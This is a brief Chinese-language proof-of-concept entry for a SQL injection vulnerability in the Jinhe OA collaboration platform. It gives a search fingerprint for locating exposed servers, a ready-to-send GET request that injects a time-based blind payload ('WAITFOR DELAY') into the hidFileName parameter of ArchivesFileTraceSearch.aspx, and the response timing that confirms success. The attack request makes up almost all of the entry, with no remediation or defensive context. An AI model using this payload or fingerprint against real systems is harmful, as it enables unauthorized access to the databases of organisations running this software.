# 金和OAArchivesFileTraceSearch存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`title="金和协同管理平台"`
- **请求**：`GET /C6/JHSoft.Web.Archives/ArchivesFileTraceSearch.aspx/?hidFileName=1222222222';WAITFOR+DELAY+'0:0:5'--+----`
- **响应特征**：200 响应时间>=5s